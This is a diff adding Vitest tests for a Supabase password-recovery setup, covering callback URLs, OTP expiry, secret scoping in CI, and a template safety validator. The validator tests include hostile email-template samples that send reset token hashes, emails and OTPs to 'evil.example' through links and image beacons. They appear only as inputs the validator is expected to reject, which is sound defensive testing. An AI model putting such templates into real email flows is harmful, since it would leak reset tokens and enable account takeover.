@@ -1,7 +1,9 @@
 import { afterEach, describe, expect, it, vi } from 'vitest';
+import { readFile } from 'node:fs/promises';
 
 import {
   isSatisfied,
+  isSafeRecoveryTemplate,
   syncSupabaseAuth,
   mailerPatch,
   missingSmtpSettings,
@@ -21,6 +23,84 @@ describe('parseAllowList', () => {
     expect(parseAllowList('')).toEqual([]);
     expect(parseAllowList(null)).toEqual([]);
     expect(parseAllowList(undefined)).toEqual([]);
+  });
+});
+
+describe('repository Auth redirect contract', () => {
+  it('declares dedicated recovery callbacks for local, preview, and production', async () => {
+    const [localConfig, pipeline, recoveryTemplate] = await Promise.all([
+      readFile(new URL('../supabase/config.toml', import.meta.url), 'utf8'),
+      readFile(new URL('../.github/workflows/pipeline.yml', import.meta.url), 'utf8'),
+      readFile(new URL('../supabase/templates/recovery.html', import.meta.url), 'utf8'),
+    ]);
+
+    expect(localConfig).toContain('http://localhost:3000/auth/recovery/callback');
+    expect(localConfig).toContain('http://127.0.0.1:3000/auth/recovery/callback');
+    expect(pipeline).toContain('https://iconsip.com/auth/recovery/callback');
+    expect(pipeline).toContain('https://www.iconsip.com/auth/recovery/callback');
+    expect(pipeline).toContain('https://icons-ip.vercel.app/auth/recovery/callback');
+    expect(pipeline).toContain('https://icons-*-sangwopark19icons-1055s-projects.vercel.app/auth/recovery/callback');
+    expect(pipeline).toContain('https://icons-git-*-sangwopark19icons-1055s-projects.vercel.app/auth/recovery/callback');
+    expect(localConfig).toContain('[auth.email.template.recovery]');
+    expect(localConfig).toContain('content_path = "./supabase/templates/recovery.html"');
+    expect(localConfig).toContain('otp_expiry = 3600');
+    expect(pipeline.match(/RECOVERY_TEMPLATE_PATH: supabase\/templates\/recovery\.html/g)).toHaveLength(1);
+    expect(pipeline.match(/EMAIL_OTP_EXPIRY_SECONDS: "3600"/g)).toHaveLength(2);
+    expect(isSafeRecoveryTemplate(recoveryTemplate)).toBe(true);
+
+    const productionDeploy = pipeline.indexOf('- name: Deploy Vercel production');
+    const productionTemplate = pipeline.indexOf(
+      '- name: Activate recovery token-hash template in production',
+    );
+    expect(pipeline).not.toContain('Activate recovery token-hash template in preview');
+    expect(productionDeploy).toBeGreaterThan(-1);
+    expect(productionTemplate).toBeGreaterThan(productionDeploy);
+
+    const productionJob = pipeline.slice(pipeline.indexOf('  deploy-vercel:'));
+    const productionJobEnv = productionJob.slice(
+      productionJob.indexOf('    env:'),
+      productionJob.indexOf('\n\n    steps:'),
+    );
+    expect(productionJobEnv).not.toContain('SUPABASE_ACCESS_TOKEN');
+    expect(productionJob.match(/SUPABASE_ACCESS_TOKEN: \$\{\{ secrets\.SUPABASE_ACCESS_TOKEN \}\}/g))
+      .toHaveLength(2);
+  });
+});
+
+describe('recovery email template contract', () => {
+  it('requires the dedicated callback with token hash and recovery type', () => {
+    expect(isSafeRecoveryTemplate(
+      '<a href="{{ .RedirectTo }}?token_hash={{ .TokenHash }}&type=recovery">reset</a>',
+    )).toBe(true);
+    expect(isSafeRecoveryTemplate('<a href="{{ .ConfirmationURL }}">reset</a>')).toBe(false);
+    expect(isSafeRecoveryTemplate(
+      '<a href="{{ .RedirectTo }}?token_hash={{ .TokenHash }}&type=signup">reset</a>',
+    )).toBe(false);
+    expect(isSafeRecoveryTemplate('<a href="{{ .SiteURL }}/auth/callback">reset</a>')).toBe(false);
+    expect(isSafeRecoveryTemplate('<a href="https://iconsip.com/auth/callback">reset</a>')).toBe(false);
+    expect(isSafeRecoveryTemplate(
+      '<p>{{ .RedirectTo }}</p><a href="https://evil.example/reset?token_hash={{ .TokenHash }}&type=recovery">reset</a>',
+    )).toBe(false);
+    expect(isSafeRecoveryTemplate(
+      '<a href="{{ .RedirectTo }}?token_hash={{ .TokenHash }}&type=recovery">reset</a>'
+      + '<img src="https://evil.example/collect?token_hash={{ .TokenHash }}">',
+    )).toBe(false);
+    expect(isSafeRecoveryTemplate(
+      '<a href="{{ .redirectto }}?token_hash={{ .tokenhash }}&type=recovery">reset</a>',
+    )).toBe(false);
+    expect(isSafeRecoveryTemplate(
+      '<p data-href="{{ .RedirectTo }}?token_hash={{ .TokenHash }}&type=recovery">reset</p>',
+    )).toBe(false);
+    expect(isSafeRecoveryTemplate(
+      '<a title="decoy href=\'{{ .RedirectTo }}?token_hash={{ .TokenHash }}&type=recovery\'">reset</a>',
+    )).toBe(false);
+    expect(isSafeRecoveryTemplate(
+      '<a <!-- href="{{ .RedirectTo }}?token_hash={{ .TokenHash }}&type=recovery" -->>reset</a>',
+    )).toBe(false);
+    expect(isSafeRecoveryTemplate(
+      '<a href="{{ .RedirectTo }}?token_hash={{ .TokenHash }}&type=recovery">reset</a>'
+      + '<img src="https://evil.example/collect?email={{ .Email }}&otp={{ .Token }}">',
+    )).toBe(false);
   });
 });
 
@@ -171,6 +251,38 @@ describe('isSatisfied', () => {
     };
     expect(isSatisfied({ ...args, config, enforceMailer: true })).toBe(true);
   });
+
+  it('version-controlled recovery template가 다르면 통과하지 않는다', () => {
+    const recoveryTemplate = '<a href="{{ .RedirectTo }}?token_hash={{ .TokenHash }}&type=recovery">reset</a>';
+
+    expect(isSatisfied({
+      ...args,
+      config: { ...base, mailer_templates_recovery_content: recoveryTemplate },
+      enforceMailer: false,
+      recoveryTemplate,
+    })).toBe(true);
+    expect(isSatisfied({
+      ...args,
+      config: { ...base, mailer_templates_recovery_content: '<a href="/old">old</a>' },
+      enforceMailer: false,
+      recoveryTemplate,
+    })).toBe(false);
+  });
+
+  it('email link TTL이 선언값과 다르면 통과하지 않는다', () => {
+    expect(isSatisfied({
+      ...args,
+      config: { ...base, mailer_otp_exp: '3600' },
+      enforceMailer: false,
+      emailOtpExpirySeconds: 3600,
+    })).toBe(true);
+    expect(isSatisfied({
+      ...args,
+      config: { ...base, mailer_otp_exp: 7200 },
+      enforceMailer: false,
+      emailOtpExpirySeconds: 3600,
+    })).toBe(false);
+  });
 });
 
 describe('mailerPatch', () => {
@@ -261,6 +373,40 @@ describe('syncSupabaseAuth', () => {
 
     await syncSupabaseAuth(env, () => {});
     expect(JSON.parse(calls[1].body).uri_allow_list).toBe(expected);
+  });
+
+  it('version-controlled recovery template를 PATCH하고 read-back으로 검증한다', async () => {
+    const recoveryTemplatePath = new URL('../supabase/templates/recovery.html', import.meta.url).pathname;
+    const recoveryTemplate = (await readFile(recoveryTemplatePath, 'utf8')).trim();
+    const env = { ...baseEnv, RECOVERY_TEMPLATE_PATH: recoveryTemplatePath };
+    const allowList = 'https://iconsip.com/auth/callback,https://www.iconsip.com/auth/callback';
+    const { calls, fetchStub } = stubFetch([
+      ok({ site_url: 'https://iconsip.com', uri_allow_list: allowList, mailer_templates_recovery_content: 'old' }),
+      ok({}),
+      ok({
+        site_url: 'https://iconsip.com',
+        uri_allow_list: allowList,
+        mailer_templates_recovery_content: recoveryTemplate,
+      }),
+    ]);
+    vi.stubGlobal('fetch', fetchStub);
+
+    await expect(syncSupabaseAuth(env, () => {})).resolves.toEqual({ patched: true });
+    expect(JSON.parse(calls[1].body).mailer_templates_recovery_content).toBe(recoveryTemplate);
+  });
+
+  it('email link TTL을 PATCH하고 read-back으로 검증한다', async () => {
+    const env = { ...baseEnv, EMAIL_OTP_EXPIRY_SECONDS: '3600' };
+    const allowList = 'https://iconsip.com/auth/callback,https://www.iconsip.com/auth/callback';
+    const { calls, fetchStub } = stubFetch([
+      ok({ site_url: 'https://iconsip.com', uri_allow_list: allowList, mailer_otp_exp: 7200 }),
+      ok({}),
+      ok({ site_url: 'https://iconsip.com', uri_allow_list: allowList, mailer_otp_exp: '3600' }),
+    ]);
+    vi.stubGlobal('fetch', fetchStub);
+
+    await expect(syncSupabaseAuth(env, () => {})).resolves.toEqual({ patched: true });
+    expect(JSON.parse(calls[1].body).mailer_otp_exp).toBe(3600);
   });
 
   it('SMTP를 요구했는데 없으면 PATCH 전에 던진다', async () => {
